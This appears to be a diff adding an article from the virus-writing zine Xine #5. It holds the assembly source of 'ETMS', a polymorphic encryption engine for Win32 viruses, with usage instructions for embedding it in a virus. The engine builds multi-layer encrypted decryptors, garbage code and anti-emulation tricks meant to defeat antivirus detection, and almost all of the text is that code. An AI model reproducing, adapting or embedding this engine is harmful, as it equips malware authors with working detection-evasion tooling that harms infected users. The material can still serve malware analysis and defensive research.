@@ -1,0 +1,2315 @@
+
+
+                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                             ³ Xine - issue #5 - Phile 300 ³
+                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+
+
+
+;
+;                      - expressway to my skull -
+;                           - [ETMS] v0.36 -
+;                             - b0z0/iKX -
+;
+; This is a polymorphic engine for Win32/Win9X viruses. It should be fully
+; compatible with any 486+ processor. You should check ver. 0.1 (Xine#4)
+; for some more basic informations.
+;
+; Changes from v0.1:
+;       - Multiple layers of encryption (random from 2 to 7 layers)
+;       - New garbage types added (MOVSX, MOVZX, BT family, SET family,
+;         XADD, SHLD/SHRD, CMPXCHG, BSWAP, XLAT, ENTER/LEAVE) on regs,
+;         mem, flags (when possible). Direct read/write on stack using
+;         ESP + offset.
+;       - Antiemulation structures (code emulation checks, stack consistency
+;         checks, stack segment play, memory consistency on writes)
+;       - New ways of incrementing/decrementing pointer/counter, changing
+;         encryption key, initializing registers and exiting from loop.
+;       - Some minor parts have been rewritten
+;
+; Using the poly:
+;   Just add the ETMS source in your virus, simply:
+;     include         etms.asm
+;   Set the registers as described below and then call the poly. The poly uses
+;  some data for internal purposes. This data of course is not needed to be
+;  carried around with your infected file or whatever. You can just include
+;  the ETMS source at the end of the file and then skip the bytes that start
+;  from the label _mem_data_start. Of course you'll need to have that free
+;  memory placed there at runtime.
+;   The random seed (the dd at seed) should be initialized at first poly
+;  run to a value between 0 and 714024.
+;
+;    Calling parameters:
+;       ECX     =       Lenght of things to be encrypted
+;       ESI     =       Pointer to what we want to encrypt
+;       EDI     =       Where to place decryptor and encrypted stuff
+;       EBP     =       Offset at which decryptor will run
+;       EDX     =       Some free temporary place for the poly
+;   The two needed space zones (EDI and EDX) should be at least 25kb plus
+;  the lenght of your code. Just allocate some mem, you're in Windoze baby!
+;
+;    On exit:
+;       EDI     =       Pointer to generated code
+;       ECX     =       Lenght of generated code (decryptor + encrypted code)
+;
+; Contacts:
+;   Email me at cl0wn@geocities.com or query me on irc.
+;
+; Special greetings:
+;   I'd like to specially thank StarZero/iKX for the great support and for
+;  convincing me to write this. Greetings also to pigpen/s0ftpj for persistent
+;  support irl, crazyness roxor! ;), and also greets to claire for making me 
+;  feel like i tought i could never feel
+;
+; Misc greetings to:
+;   The entire iKX and S0ftpj crew and: kernel panic, darkman, gigabyte,
+;  jackie-, rucker, talena, benny, inty13, uselessa, reptile, dandler, fusys,
+;  jhb, slagehammer, giorgetto, tankie, griyo and gf, vecna, belfa, del0,
+;  wintermute, spanska, sepultura, cavallo, milla, ^syren^, claire.
+;
+;                          - live fast, die young -
+;                        - written in aug/sept 2000 -
+;
+
+poly:
+        cld
+        push    edi
+        push    edi
+
+        call    poly_delta
+poly_delta:
+        pop     eax                     ; where we are running
+        sub     eax,offset poly_delta
+        push    ecx
+        push    eax
+
+        lea     ebx,[offset v_runnin + eax]
+
+o_vrun  equ     offset v_runnin         ; save some bytes since off between
+                                        ; various data is a 8b
+        mov     dword ptr [ebx],ebp
+        mov     dword ptr [ebx - (o_vrun - offset orig_dx)],edx
+        mov     dword ptr [ebx - (o_vrun - offset layer_nr)],tl_space
+
+        xor     ecx,ecx
+bit_loop:
+        inc     ecx
+        shl     ebp,1
+        jnc     bit_loop       ; find higher bit with an 1
+        dec     ecx            ; for random memory offsets
+
+        mov     byte ptr [ebx - (o_vrun - offset t_memand)],cl
+        pop     ebp                             ; delta
+
+how_manylayers:
+        call    get_random_al7          ; random number of layers
+        cmp     al,6                    ; from 2 to 7
+        jae     how_manylayers
+        mov     ecx,l_space
+        mul     ecx
+        mov     dword ptr [ebx - (o_vrun - offset layer_end)],eax
+
+        pop     ecx
+start_layer:
+
+o_tini  equ     offset r_pointer
+        lea     ebx,[offset r_pointer + ebp]
+                                        ; dest, cnt and source
+        mov     dword ptr [ebx - (o_tini - offset t_inipnt)],edi
+        mov     dword ptr [ebx - (o_tini - offset v_lenght)],ecx
+        mov     dword ptr [ebx - (o_tini - offset v_virusp)],esi
+
+        mov     dword ptr [ebx - (o_tini - offset r_pointer)],010ffffffh
+        mov     dword ptr [ebx - (o_tini - offset t_chgpnt)],01000404h
+
+        xor     eax,eax
+        mov     dword ptr [ebx - (o_tini - offset t_fromend)],eax
+        mov     dword ptr [ebx - (o_tini - offset t_pntoff)],eax
+        mov     dword ptr [ebx - (o_tini - offset t_cntoff)],eax
+        mov     dword ptr [ebx - (o_tini - offset w_loopbg)],eax
+        mov     dword ptr [ebx - (o_tini - offset t_inacall)-2],eax
+        inc     al
+        mov     dword ptr [ebx - (o_tini - offset t_exitjmp)],eax
+
+        push    edi                     ; initialize layer data
+        mov     ecx,[ebx - (o_tini - offset layer_nr)]
+        lea     edi,[ebx - (o_tini - offset enc_space) + ecx + 10h]
+                        ; init layers encryptor, regs struct no needed
+        mov     al,90h                  ; virgin encryptor
+        mov     dword ptr [ebx - (o_tini - offset w_encrypt)],edi
+        mov     ecx,enc_max
+        rep     stosb
+        pop     edi
+
+        call    rnd_garbage
+
+        mov     ecx,3
+
+        mov     esi,ebx                 ; to memory structures
+        mov     edx,dword ptr [esi - (o_tini - offset layer_nr)]
+                                 ; edx has offset in the layer structure
+init_part:
+        push    ecx
+select_register:
+        call    get_register                    ; get a unused register
+        xchg    ebx,ecx
+
+select_block:
+        call    get_random_al7
+        and     al,011b
+        jz      select_block                    ; select from 01 to 03
+
+        dec     eax
+        cmp     byte ptr [eax+esi],0ffh         ; check if that stage already
+        jne     select_block                    ; done
+
+        mov     byte ptr [eax+esi],bl           ; save the register for that
+                                                ; stage
+        or      al,al
+        jnz     not_pointer
+
+     mov dword ptr [esi - (offset r_pointer - offset enc_space) + edx + 12],edi
+                                                ; save offset where the
+        jmp     assign_next                     ; pointer is initialized
+
+not_pointer:
+        dec     eax
+        jnz     not_counter
+
+        mov     dword ptr [esi - (offset r_pointer - offset w_counter)],edi
+        jmp     assign_next                     ; assign inital counter
+
+not_counter:
+
+        call    get_random                      ; get key
+
+      mov     dword ptr [esi - (offset r_pointer - offset enc_space) + edx],eax
+        xchg    eax,ecx                         ; save key for encryptor
+
+        call    get_random
+        and     al,1
+        jz      assign_next                     ; if so use key
+        mov     byte ptr [esi+2],20h            ; don't use key, just imm
+        jmp     next_loop
+assign_next:
+                ; BL  register
+                ; ECX value
+
+; either with mov reg, imm or via stack
+        call    get_random
+        shr     al,1
+        jnc     do_withmov
+        mov     al,068h                 ; push immediate
+        stosb
+        xchg    eax,ecx
+        stosd
+        call    rnd_garbage
+        mov     al,bl
+        add     al,058h                 ; pop reg32 base
+        stosb
+        jmp     next_loop
+do_withmov:
+        mov     eax,ebx                 ; in bl register
+        or      al,0b8h                 ; mov base
+        stosb
+        xchg    eax,ecx
+        stosd                           ; the value
+
+next_loop:
+        mov     al,bl
+        call    set_used                ; mark as unusable so far
+
+        call    rnd_garbage
+        pop     ecx
+        loop    init_part               ; make all init steps
+
+
+; now some base assignment to a pointer, counter and key (if used) registers
+; has been done. here we are gonna change a bit the various registers where
+; the various things has been assigned
+        call    get_random_al7
+        and     al,011b                 ; from 0 to 3 moves, could be 0-7 ?
+        jz      decryptor_build_start
+        xchg    eax,ecx
+reg_movida:
+        push    ecx
+get_whichone:
+        call    select_save             ; select which to change (pnt,cnt,key)
+        jc      leave_this_out
+
+        call    save_mov_xchg           ; change the regs using mov or xchg
+        mov     byte ptr [edx],al
+leave_this_out:
+        pop     ecx
+        loop    reg_movida
+
+decryptor_build_start:
+; decryptor loop begins right here
+
+        lea     esi,[offset t_chgpnt + ebp]
+        mov     dword ptr [esi - (offset t_chgpnt - offset w_loopbg)],edi
+
+        call    get_random              ; select if starting from head or from
+        and     ax,0101h                ; tail and if counter will dec or inc
+        mov     word ptr [esi - (offset t_chgpnt - offset t_fromend)],ax
+
+        xchg    eax,edx                 ; rnd in edx
+
+        shl     edx,1                   ; add a constant to counter?
+        jnc     normal_counter
+        call    get_random
+        mov     dword ptr [esi - (offset t_chgpnt - offset t_cntoff)],eax
+normal_counter:
+        cmp     byte ptr [esi - (offset t_chgpnt - offset r_pointer)],05h
+                                        ; no bp + off
+        je      reget_size_op
+
+        shl     edx,1                   ; select if use only pointer or
+        jc      reget_size_op           ; pointer + offset
+        call    get_random              ; select random offset
+        mov     dword ptr [esi - (offset t_chgpnt - offset t_pntoff)],eax
+                                        ; if using get offset
+reget_size_op:
+        call    get_random
+        mov     edx,eax
+        and     eax,0fh                 ; select math operation and size
+        or      eax,eax                 ; of operand
+        jz      reget_size_op
+
+;      byte  word  dword
+; ror   1     6     b
+; sub   2     7     c
+; xor   3     8     d
+; add   4     9     e
+; rol   5     a     f
+;
+no_rorrrpr:
+        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],03
+                                        ; if not ax,cx,dx,bx then can't be byte
+        jb      can_use_all             ; as key
+        cmp     al,6                    ; is byte? get another
+        jb      reget_size_op
+
+can_use_all:
+        xor     ecx,ecx
+        mov     cl,10 ;9
+        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
+        je      no_keychanges
+
+        shr     edx,8                   ; edx has rnd
+        and     edx,011b
+        mov     byte ptr [esi - (offset t_chgpnt - offset t_chgkey)],dl
+        add     ecx,edx                 ; add nr of key changes
+
+no_keychanges:
+        cmp     al,0bh
+        jae     ok_counts
+        sub     ecx,4d                  ; if with words 4 inc/dec less
+        sub     word ptr [esi],0202h
+        cmp     al,06d
+        jae     ok_counts
+        dec     ecx                     ; for bytes even less
+        dec     ecx
+        sub     word ptr [esi],0101h
+
+ok_counts:
+        push    eax
+        call    rnd_garbage
+get_nextseq:
+        call    get_random_al7
+        cmp     al,4
+        ja      get_nextseq
+        xchg    eax,edx
+        cmp     byte ptr [esi+edx],0    ; need more ?
+        je      get_nextseq
+        dec     byte ptr [esi+edx]
+        shl     edx,2                   ; offset = * 4
+        sub     edx,(offset t_chgpnt - offset o_table)
+        pop     eax
+        push    eax
+        push    ecx
+        push    esi
+        mov     ecx,dword ptr [esi+edx]
+        add     ecx,ebp
+        call    ecx                     ; call the routine to do it
+        pop     esi
+        pop     ecx
+        pop     eax
+        loop    ok_counts
+
+; finished decryption loop, needs just the jump backwards
+        call    rnd_garbage
+
+        mov     al,0e9h
+        stosb
+        xor     eax,eax
+        xchg    eax,dword ptr [esi - (offset t_chgpnt - offset w_loopbg)]
+                                                ; the jump back to start of
+        sub     eax,04h                         ; the decryptor and enable
+        sub     eax,edi                         ; overwriting on loop :)
+        stosd
+
+        call    rnd_garbage
+        call    rnd_garbage
+
+        lea     esi,[offset v_lenght + ebp]
+
+        push    edi             ; write the offset of the exit jump
+        mov     edx,dword ptr [esi - (offset v_lenght - offset t_chkpos)]
+        sub     edi,edx
+        mov     dword ptr [edx-4],edi
+        pop     edi
+
+; now decryption loop generation is finished
+        mov     byte ptr [esi - (offset v_lenght - offset r_used)],10h
+                                        ; can use all regs (except ESP) again
+
+        call    rnd_garbage             ; unencrypted one, some more here
+        call    rnd_garbage
+
+        push    edi
+        call    rnd_garbage                     ; encrypted garbage
+        pop     ecx
+        neg     ecx
+        add     ecx,edi                 ; how much encrypted garbage
+
+        mov     edx,ecx
+        sub     edi,edx
+
+        add     ecx,dword ptr [esi]
+
+        shr     ecx,2                   ; so it will be enough for b/w/d enc
+        inc     ecx
+        shl     ecx,2
+
+        movzx   eax,byte ptr [esi - (offset v_lenght - offset t_prejmp)]
+        add     ecx,eax         ; decs before cmp, so we reach equality
+
+        pop     eax
+        neg     eax
+        add     eax,edi                         ; lenght of decryptor
+
+        add     eax,edx         ; total displacement for this layer
+        push    eax             ; so we can correct mem refs
+        sub     eax,edx
+
+        add     eax,dword ptr [esi - (offset v_lenght - offset v_runnin)]
+                                                ; running offset
+
+        push    esi
+        add     esi,dword ptr [esi - (offset v_lenght - offset layer_nr)]
+        mov     ebx,dword ptr [esi - (offset v_lenght - offset enc_space) + 12]
+        pop     esi
+        cmp     byte ptr [esi - (offset v_lenght - offset t_fromend)],00h
+        pushf
+        je      no_adding
+        add     eax,ecx                         ; from end
+no_adding:
+        sub     eax,dword ptr [esi - (offset v_lenght - offset t_pntoff)]
+                                                ; - pointer offset if is there
+        mov     dword ptr [ebx+1],eax           ; set initial pointer
+
+        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_counter)]
+        inc     ebx
+
+        mov     eax,dword ptr [esi - (offset v_lenght - offset t_cntoff)]
+        add     eax,ecx
+        mov     dword ptr [ebx],eax
+
+        cmp     byte ptr [esi - (offset v_lenght - offset t_countback)],01h
+        je      not_negcnt
+        neg     dword ptr [ebx]
+
+not_negcnt:
+
+        mov     ebx,edi                 ; pointer on code to encrypt
+        add     edi,edx                 ; + encrypted garbage
+        popf
+        je      no_adding2
+        add     ebx,ecx                 ; add lenght if from end
+
+no_adding2:
+
+; save layer data (cnt and pnt) in its entry
+        push    esi
+        add     esi,dword ptr [esi - (offset v_lenght - offset layer_nr)]
+        mov     dword ptr [esi - (offset v_lenght - offset enc_space) +4],ecx
+        mov     dword ptr [esi - (offset v_lenght - offset enc_space) +8],ebx
+        pop     esi
+
+        push    esi
+        mov     esi,dword ptr [esi - (offset v_lenght - offset v_virusp)]
+        push    ecx
+        sub     ecx,edx
+        rep     movsb                   ; copy what to encrypt
+        pop     edx
+        pop     esi
+
+        pop     eax                     ; this layer lenght to sum
+
+        mov     ecx,dword ptr [esi - (offset v_lenght - offset layer_nr)]
+
+corr_addr:
+        cmp     ecx,tl_space    ; correct the adresses of the lower layers
+        je      corr_end
+        add     ecx,l_space
+
+        add     [esi - (offset v_lenght - offset enc_space) + ecx + 12d],eax
+        add     [esi - (offset v_lenght - offset enc_space) + ecx + 8d],eax
+
+        mov     ebx,[esi - (offset v_lenght - offset enc_space) + ecx + 12d]
+        add     dword ptr [ebx + 1],eax         ; pointer from decryptor
+        jmp     corr_addr
+
+corr_end:
+        mov     ecx,dword ptr [esi - (offset v_lenght - offset layer_end)]
+
+        cmp     dword ptr [esi - (offset v_lenght - offset layer_nr)],ecx
+        je      finished_layers
+
+        sub     dword ptr [esi - (offset v_lenght - offset layer_nr)],l_space
+
+        pop     ecx             ; initial EDI
+        push    ecx
+        push    ecx
+        push    ecx
+        sub     ecx,edi         ; calculate new lenght to encrypt
+        neg     ecx
+        pop     edi
+
+        push    ecx
+        mov     esi,dword ptr [esi - (offset v_lenght - offset orig_dx)]
+        xchg    esi,edi
+        mov     edx,edi
+        push    esi
+        rep     movsb           ; copy to temp space and use that one
+        pop     edi             ; as source for next layer
+        mov     esi,edx
+        pop     ecx
+        jmp     start_layer     ; construct next encryption layer
+
+finished_layers:
+
+; now in reverse order
+; create each encryption layer
+        mov     eax,dword ptr [esi - (offset v_lenght - offset layer_end)]
+        sub     esi,(offset v_lenght - (offset enc_space + 10h) - tl_space)
+        push    edi
+enc_nl:
+
+        mov     ecx,enc_max                     ; the stored regs
+        lea     edi,[ebp + offset enc_space_final]
+        rep     movsb
+
+        mov     ecx, [esi - enc_max - 16]       ; key value
+        mov     edx, [esi - enc_max - 12]       ; counter
+        mov     ebx, [esi - enc_max - 8]        ; pointer
+        sub     esi, (l_space + enc_max)        ; on next layer
+
+; layer chunk, most of it will be overwritten by the one in the structure
+
+enc_max equ     24h
+; lenghts
+; 6     = max encryption operation
+; 4     = max 4 inc/dec counter
+; 4     = max 4 inc/dec counter
+; 3 * 6 = max 3 * 6 byte key change operations
+; 4     = check on edx + jump short
+
+enc_space_final:
+        db      enc_max dup (90h)       ; here the encryptor will be placed
+        jmp     enc_space_final
+exit_space_final:
+
+        add     eax,l_space             ; next layer structure
+        cmp     eax,(tl_space + l_space); last layer to do?
+        jne     enc_nl
+
+ll_end:
+        pop     ecx                     ; the final edi
+        pop     edi                     ; calling edi
+        sub     ecx,edi                 ; total lenght
+        ret                             ; poly finished
+
+; - ETMS return point
+poly_name       db      '[ETMS] v0.36 -b0z0/iKX-'
+
+put_encloop_2:
+        push    ecx
+        xor     ecx,ecx
+        inc     ecx
+        inc     ecx
+        jmp     short put_encloop
+put_encloop_1:
+        push    ecx
+        xor     ecx,ecx
+        inc     ecx
+put_encloop:
+; ecx nr of bytes
+        push    eax
+        xchg    edi,dword ptr [w_encrypt+ebp]   ; in EDI where we are in enc
+                                                ; and save dec position
+copy_it:
+        stosb
+        shr     eax,8
+        loop    copy_it
+        xchg    dword ptr [w_encrypt+ebp],edi   ; save next and restore dec pnt
+        pop     eax
+        pop     ecx
+        ret
+
+o_table:
+o_counter       dd      offset ch_counter
+o_pointer       dd      offset ch_pointer
+o_key           dd      offset ch_key
+o_mate          dd      offset ch_mate
+o_exitjmp       dd      offset ch_exitjmp
+
+ch_exitjmp:             ; compare and exit jump for dec loop
+        xor     eax,eax
+        inc     eax
+        mov     ecx,dword ptr [esi - (offset t_chgpnt - offset t_cntoff)]
+        or      ecx,ecx
+        jnz     must_compare            ; is + a constant ?
+
+get_checker:
+        call    get_random
+        and     eax,0fh
+        cmp     al,09d
+        ja      get_checker
+must_compare:
+        shr     al,1
+        pushf
+        mov     ah,byte ptr [eax + offset chk_counter + ebp]   ; get comparer
+        add     ah,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
+        mov     al,81h
+        popf
+        jc      store_d00
+        inc     eax
+        inc     eax
+        stosw
+        xor     al,al
+        stosb
+        jmp     make_jumps
+store_d00:
+        stosw
+        xchg    eax,ecx
+        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],01h
+        je      not_negcnt1
+        neg     eax
+not_negcnt1:
+        stosd
+make_jumps:
+        mov     ax,840fh                ; jz long
+        stosw
+        stosd
+        mov     dword ptr [esi - (offset t_chgpnt - offset t_chkpos)],edi
+done_cond:
+
+        xchg    edi,dword ptr [esi - (offset t_chgpnt - offset w_encrypt)]
+        mov     ax,0d20bh
+        stosw
+        mov     eax,edi
+        sub     eax,dword ptr [esi - (offset t_chgpnt - offset layer_nr)]
+        sub     eax,(offset enc_space)+10h+enc_max
+        add     eax,ebp       ; must go over the jump
+        neg     eax
+        mov     ah,74h
+        xchg    al,ah
+        stosw
+        xchg    edi,dword ptr [esi - (offset t_chgpnt - offset w_encrypt)]
+
+        ret
+
+ch_counter:                             ; decrement/increment counter
+        cmp     byte ptr [esi - (offset t_chgpnt - offset t_exitjmp)],00h
+        je      no_pntchgndd
+        inc     byte ptr [esi - (offset t_chgpnt - offset t_prejmp)]
+no_pntchgndd:
+        mov     ah,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
+        mov     al,byte ptr [esi - (offset t_chgpnt - offset t_countback)]
+        mov     cl,0ah          ; edx + always dec in encryptor
+        jmp     mk_incdec
+
+ch_pointer:                             ; increment/decrement pointer
+        mov     ah,byte ptr [esi - (offset t_chgpnt - offset r_pointer)]
+        mov     al,byte ptr [esi - (offset t_chgpnt - offset t_fromend)]
+        mov     cl,03h          ; using ebx in encryptor
+;        jmp     mk_incdec
+
+mk_incdec:
+; al = 0 means dec, 1 means inc
+; ah = register to use
+; cl = oring for encryptor
+        shl     al,3
+        or      al,40h
+        or      al,ah
+        push    eax
+        push    eax             ; will need this one for encryptor
+        call    get_random_al7  ; how enc/dec stuff ?
+        shr     al,1
+        jnc     lbl_hh
+        pop     eax
+        jmp     set_enc_id_pre  ; do with inc/dec
+lbl_hh:
+        shr     al,1
+        mov     al,083h         ; common prefix
+        stosb
+        pop     eax
+        jc      do_with_sub
+; do with add (either +1 or +(-1))
+        or      ah,0c0h
+        and     al,8h           ; was decrementing ?
+        jnz     use_minus1
+        jmp     use_plus1
+
+do_with_sub:
+        or      ah,0e8h
+        and     al,08h          ; was incrementing
+        jz      use_minus1
+
+use_plus1:
+        xor     al,al           ; 01h
+        inc     al
+        jmp     set_enc_id_pre2
+use_minus1:
+        xor     al,al           ; 0ffh
+        dec     al
+set_enc_id_pre2:
+        xchg    ah,al
+        stosb
+        xchg    ah,al
+set_enc_id_pre:
+        stosb
+set_enc_id:
+        pop     eax
+        and     al,(NOT 0111b)
+        or      al,cl
+        jmp     put_encloop_1   ; put in encryptor and go away
+
+ch_key:                                 ; change key register
+        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
+        je      exit_keychange
+get_modifier:
+        call    get_random_al7
+        mov     cl,al
+        mov     ah,byte ptr [eax + offset key_changers + ebp]
+        mov     al,81h          ; add/sub/xor base
+
+        cmp     cl,3
+        jb      no_rrrr
+        mov     al,0c1h         ; rol/ror base
+
+        cmp     cl,5
+        jne     no_rrrr
+        mov     al,0f7h
+
+no_rrrr:
+        push    eax
+reget_ksize:
+        call    get_random      ; select if byte/word/dword
+        and     al,011b
+        jz      reget_ksize
+        cmp     cl,05h          ; inc dec just on dw and dd
+        jbe     isntincdec
+        cmp     al,01h
+        je      reget_ksize
+isntincdec:
+        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],3
+        jbe     canall
+        cmp     al,01b          ; byte keychange only for ax,cx,dx,bx
+        je      reget_ksize
+canall:
+        mov     ch,al
+        mov     dl,ah           ; random stuff
+        pop     eax
+        cmp     ch,01h
+        jne     no_decbyte
+        dec     al
+        shr     dl,1
+        jc      no_decbyte
+        add     ah,04h          ; work on high byte
+no_decbyte:
+        cmp     ch,02h
+        jne     no_wordprefix
+        push    eax
+        mov     al,66h
+        stosb
+        call    put_encloop_1
+        pop     eax
+no_wordprefix:
+        cmp     cl,06h
+        pushf
+        jb      no_incdecch             ; inc/dec has just one byte opcode
+        dec     edi
+        mov     al,byte ptr [edi]
+no_incdecch:
+        popf
+        push    eax
+        jb      no_nopneeded
+        mov     al,ah
+        or      al,1            ; ecx key in enc loop
+        call    put_encloop_1   ; for inc/dec
+        jmp     short after_store
+no_nopneeded:
+        or      ah,1            ; key is ECX in enc loop
+        call    put_encloop_2
+after_store:
+        pop     eax
+        or      ah,byte ptr [esi - (offset t_chgpnt - offset r_regkey)]
+        stosw
+        cmp     cl,05           ; inc/dec/not doesn't need any key
+        jae     exit_keychange
+        call    get_random
+        cmp     cl,03
+        jae     just_one_bk     ; ror/rol just one byte key
+        cmp     ch,01h
+        je      just_one_bk     ; check dimension of key modifier
+        stosb
+        call    put_encloop_1
+        shr     eax,8h
+        cmp     ch,02h
+        je      just_one_bk
+        stosw
+        call    put_encloop_2
+        shr     eax,10h
+just_one_bk:
+        stosb
+        call    put_encloop_1
+exit_keychange:
+        ret
+
+ch_mate:                        ; creates the decryption math operation
+
+        xor     edx,edx
+        mov     ecx,5h
+type_sel:
+        cmp     eax,ecx
+        jbe     ok_regs
+        inc     edx
+        sub     eax,ecx
+        jmp     type_sel        ; get type and size.. in EDX size, in EAX type
+                                ; edx = 0 for byte, 1 for word, 2 for dword
+
+ok_regs:
+        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
+        lea     esi,[offset _math_imm + ebp]
+        je      without_key
+        add     esi,(offset _math_key - offset _math_imm)
+without_key:
+        dec     eax             ; type - 1
+        push    esi
+        push    eax
+        shl     eax,1           ; each type is a word
+        add     esi,eax
+        lodsw                   ; ax = mathop word
+
+        cmp     dl,1
+        jne     not_word
+        push    eax
+        mov     al,066h
+        stosb
+        call    put_encloop_1
+        pop     eax
+not_word:
+        or      dl,dl
+        jnz     not_byte
+        dec     al
+not_byte:
+        pop     ebx             ; type - 1
+        pop     esi             ;
+
+        push    ebx
+
+        push    eax
+        neg     ebx
+        add     ebx,4           ; get opposite math operation
+        shl     ebx,1
+        add     esi,ebx
+        lodsw
+
+        lea     esi,[offset r_regkey + ebp]
+        cmp     byte ptr [esi],20h
+        je      ok_regskey
+        cmp     al,0d3h
+        je      ok_regskey
+        add     ah,08h          ; since ECX is used as key
+ok_regskey:
+        or      dl,dl
+        jnz     not_byterev
+        dec     al
+not_byterev:
+        add     ah,03h          ; in enc loop using EBX
+        call    put_encloop_2
+        pop     eax
+
+        mov     cl,byte ptr [esi - (offset r_regkey - offset r_pointer)]
+        cmp     cl,03h          ; eax-ebx
+        ja      upper_ones
+        add     ah,cl
+        jmp     ok_register_p
+upper_ones:
+        add     ah,06h
+        cmp     cl,06h          ; esi
+        je      ok_register_p
+        inc     ah
+        cmp     cl,07h          ; edi
+        je      ok_register_p
+        add     ah,03eh         ; ebp
+ok_register_p:
+
+        pop     ecx             ; type-1
+
+        cmp     dword ptr [esi - (offset r_regkey - offset t_pntoff)],0
+        je      not_plusoff
+        add     ah,80h
+not_plusoff:
+        stosw
+
+        xor     eax,eax
+
+        cmp     byte ptr [esi],20h    ; using key?
+        je      ok_register_k
+
+        or      cl,cl
+        je      check_rr
+        cmp     cl,4
+        jne     not_rol_ror
+check_rr:
+        cmp     byte ptr [esi],1   ; is key CX (cl)
+        je      ok_register_k
+        mov     al,10h                  ; if not put just immediate
+        sub     byte ptr [edi-2],12h
+
+        mov     ebx,dword ptr [esi - (offset r_regkey - offset w_encrypt)]
+        sub     byte ptr [ebx-2],12h
+
+        push    ecx
+        mov     bl,20h
+        xchg    bl,byte ptr [esi]       ; won't use key reg anymore in the
+        call    unset_used              ; future, so use for garbage
+        pop     ecx
+        jmp     short ok_register_k
+
+not_rol_ror:
+        mov     al,byte ptr [esi]
+        shl     eax,3                   ; * 8
+        add     byte ptr [edi-1],al     ; key register
+
+ok_register_k:
+        cmp     byte ptr [esi - (offset r_regkey - offset r_pointer)],05h
+        jne     not_usingbp
+        mov     byte ptr [edi],00h
+        inc     edi
+not_usingbp:
+
+        mov     eax,dword ptr [esi - (offset r_regkey - offset t_pntoff)]
+        or      eax,eax
+        jz      no_offsetadd
+        stosd
+no_offsetadd:
+        cmp     byte ptr [esi],20h
+        jne     no_key_needed
+
+        push    esi
+        add     esi,dword ptr [esi - (offset r_regkey - offset layer_nr)]
+        mov     eax,dword ptr [esi - (offset r_regkey - offset enc_space)]
+        pop     esi
+        or      cl,cl
+        je      byte_key
+        cmp     cl,4
+        je      byte_key
+        or      dl,dl
+        je      byte_key
+
+        stosb
+        call    put_encloop_1
+
+        shr     eax,8
+        dec     dl
+        jz      byte_key
+        stosw
+        call    put_encloop_2
+        shr     eax,10h
+byte_key:
+        stosb
+        call    put_encloop_1
+
+no_key_needed:
+        ret
+
+rnd_garbage:
+        push    ecx
+        push    eax
+        call    get_random
+        and     eax,0fh         ; max - 1
+        inc     eax             ; not zero
+        xchg    eax,ecx
+
+garbager:
+; ecx how many
+        push    edx
+        push    ebx
+garbager_loop:
+        push    ecx
+get_op_type:
+        call    get_random      ; how many possible types
+        and     eax,garbage_mask
+        cmp     eax,garbage_number
+        ja      get_op_type
+
+        mov     ecx,[(eax*4)+offset garbage_offsets+ebp]
+        add     ecx,ebp
+        call    ecx                     ; call garbage routine
+        pop     ecx
+        loop    garbager_loop
+
+        mov     eax,dword ptr [t_pushed+ebp]
+
+        cmp     eax,000005h     ; if not in a call, not in a jump and
+        ja      stack_is_ok     ; pushed <=5
+
+        or      eax,eax
+        jz      stack_is_ok
+
+        inc     byte ptr [t_inacall+ebp]
+
+        cmp     al,01h
+        ja      direct_addesp
+        call    do_pop_nocheck
+        jmp     stack_is_ok
+
+direct_addesp:
+        push    eax             ; then correct stack
+        mov     ax,0c483h       ; add esp,nr_dd * 4
+        stosw
+        pop     eax
+        call    force_popall
+stack_is_ok:
+        pop     ebx
+        pop     edx
+
+        pop     eax
+        pop     ecx
+        ret
+
+do_push:
+        cmp     byte ptr [t_pushed+ebp],05h     ; max dwords on the stack
+        ja      exit_pusher
+        inc     byte ptr [t_pushed+ebp]
+        call    get_random              ; 4 types of pushing
+        and     al,011b
+        jz      push_register           ; normal push reg
+        dec     al
+        jz      push_immediate_dd       ; push immediate double
+        dec     al
+        jz      push_immediate_by       ; push immediate byte
+
+        mov     ax,35ffh                ; push immediate from memory
+        stosw
+        call    get_address
+        jmp     pre_exit_dd
+
+push_immediate_by:
+        mov     al,6ah
+        stosb
+        shr     ah,1
+        jc      zero_or_menouno
+        bswap   eax
+        jmp     pre_exit_pusher
+
+zero_or_menouno:                        ; very usual pushes
+        xchg    ah,al
+        and     al,01b                  ; so we will get 0 or -1
+        dec     al                      ; to LARGE 0 or to LARGE -1
+        jmp     pre_exit_pusher
+
+push_immediate_dd:
+        mov     al,68h
+        stosb
+        call    get_random
+pre_exit_dd:
+        stosd                           ; normal push as double
+        jmp     exit_pusher
+
+push_register:
+        call    get_random_al7
+        add     al,050h
+pre_exit_pusher:
+        stosb
+exit_pusher:
+        jmp     exit_ppc
+
+do_pop:
+        cmp     byte ptr [t_pushed+ebp],00h
+        je      return_nopop
+do_pop_nocheck:
+        call    get_random
+        shr     al,1
+        jnc     popintoreg2
+        mov     ax,0c483h       ; add esp,
+        stosw
+get_number:
+        call    get_random_al7
+        jz      get_number
+        cmp     al,byte ptr [t_pushed+ebp]
+        ja      get_number
+force_popall:
+        sub     byte ptr [t_pushed+ebp],al
+        shl     al,2            ; dd are pushed, so * 4
+        jmp     store_ngo2
+popintoreg2:
+        call    get_register
+        add     cl,058h         ; pop in a register
+        xchg    eax,ecx
+        dec     byte ptr [t_pushed+ebp]
+store_ngo2:
+        stosb
+return_nopop:
+        jmp     exit_ppc
+
+call_subroutines:
+        cmp     word ptr [t_maxjmps+ebp],0h      ; don't nest too much nor
+        jne     just_exit_call                   ; put pushes/pops in subs and
+                                                 ; we can't know wassup in
+                                                 ; conditional jumps and such
+
+        inc     byte ptr [t_inacall+ebp]
+
+        call    get_random_al7
+        cmp     al,01h          ; 00h and 01h push
+        jbe     do_push
+        cmp     al,05           ; 02h - 05h pops (more probable so final stack
+        jbe     do_pop          ; correction should be needed less often)
+
+        ; 06,07 do a call
+        mov     al,0e8h
+        stosb
